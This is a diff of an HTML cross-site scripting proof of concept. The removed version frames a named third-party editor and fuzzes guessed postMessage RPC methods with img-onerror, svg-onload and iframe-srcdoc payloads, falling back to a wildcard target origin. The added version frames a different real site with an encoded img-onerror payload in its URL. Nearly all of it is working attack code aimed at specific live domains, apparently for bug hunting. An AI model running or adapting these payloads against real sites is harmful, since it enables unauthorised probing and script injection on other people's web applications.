@@ -1,110 +1,16 @@
+<!-- file: xss_poc.html -->
 <!DOCTYPE html>
 <html>
-<head>
-  <meta charset="UTF-8">
-  <title>🚨 RPC XSS PoC</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      max-width: 900px;
-      margin: 0 auto;
-      padding: 20px;
-    }
-    iframe {
-      border: 2px solid #ff0000;
-      margin-top: 20px;
-    }
-  </style>
-</head>
-<body>
-  <h2>🚀 RPC PoC for Toloka iframe</h2>
-  <iframe id="evil" src="https://tb.toloka.dev/editor" width="100%" height="600"></iframe>
-
-  <script>
-    const iframeEl = document.getElementById("evil");
-    const targetOrigin = "https://tb.toloka.dev/editor";
-    const iframeMethods = [
-      "renderMarkdown", "loadPreview", "getPreview", "injectTemplate",
-      "parseHTML", "setContent", "showMarkdown", "convert",
-      "previewTemplate", "parseTemplate", "display", "loadMarkdown",
-      "send", "getMessage", "reply", "getData", "read", "getText",
-      "render", "echo"
-    ];
-
-    const payloads = [
-      `<img src=x onerror="alert('XSS via RPC')">`,
-      `<svg/onload="alert('XSS Successful')">`,
-      `<iframe srcdoc="<script>alert('XSS in iframe')<\/script>">`
-    ];
-
-    let rpcIdCounter = 1;
-    let testResults = [];
-
-    // معالجة الردود من iframe
-    window.addEventListener("message", (event) => {
-      if (event.origin !== targetOrigin && !event.origin.includes("toloka.dev")) {
-        console.warn(`[⚠️] Received message from untrusted origin: ${event.origin}`);
-        return;
-      }
-
-      console.log(`[📩] Received reply from ${event.origin}:`, event.data);
-      
-      // تسجيل النتائج للتحليل لاحقاً
-      if (event.data && event.data.id) {
-        testResults.push({
-          id: event.data.id,
-          method: event.data.method,
-          result: event.data.result,
-          error: event.data.error,
-          origin: event.origin
-        });
-      }
-    });
-
-    // إرسال طلبات RPC
-    function sendRpcRequest(method, payload) {
-      const rpcId = `xss-test-${rpcIdCounter++}`;
-      
-      const message = {
-        type: "RPC",
-        method: method,
-        id: rpcId,
-        params: [payload]
-      };
-
-      console.log(`[🚀] Sending RPC: method=${method}, id=${rpcId}`);
-      
-      try {
-        iframeEl.contentWindow.postMessage(message, targetOrigin);
-      } catch (e) {
-        console.error(`[❌] Failed to send RPC to ${method}:`, e);
-        // Fallback إلى origin عام إذا فشل
-        iframeEl.contentWindow.postMessage(message, "*");
-      }
-    }
-
-    // عند تحميل iframe
-    iframeEl.addEventListener("load", () => {
-      console.log("✅ iframe loaded, starting RPC fuzzing...");
-      
-      // اختبار كل دالة مع كل payload
-      iframeMethods.forEach(method => {
-        payloads.forEach(payload => {
-          setTimeout(() => {
-            sendRpcRequest(method, payload);
-          }, 100 * rpcIdCounter); // تأخير تدريجي بين الطلبات
-        });
-      });
-    });
-
-    // وظيفة مساعدة لعرض النتائج
-    function showResults() {
-      console.table(testResults);
-      alert(`تم إكمال ${testResults.length} اختبار RPC. راجع الكونسول للتفاصيل.`);
-    }
-
-    // عرض النتائج بعد 10 ثواني
-    setTimeout(showResults, 10000);
-  </script>
-</body>
+  <head>
+    <title>DOM XSS PoC | thebrowser.company</title>
+  </head>
+  <body>
+    <h2>🔥 DOM XSS PoC</h2>
+    <iframe 
+      src="https://thebrowser.company/?x=%3Cimg%20src=x%20onerror=alert('DOM_XSS_FROM_IFRAME')%3E" 
+      width="100%" 
+      height="700" 
+      style="border: 2px solid red">
+    </iframe>
+  </body>
 </html>
